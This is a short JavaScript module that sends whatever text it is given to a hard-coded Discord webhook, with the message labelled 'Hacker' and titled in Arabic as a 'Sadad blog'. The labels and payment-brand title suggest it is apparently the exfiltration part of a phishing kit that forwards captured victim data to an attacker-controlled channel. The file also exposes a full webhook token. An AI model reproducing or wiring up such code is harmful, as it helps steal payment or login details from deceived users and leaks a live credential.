import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324587781724573736/lPeWZD-es4hqdmCveRhpky9h0NPxh9SuqClOVAqrrMTPg73BpNTc8XWkMLodPKkgm4ix",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
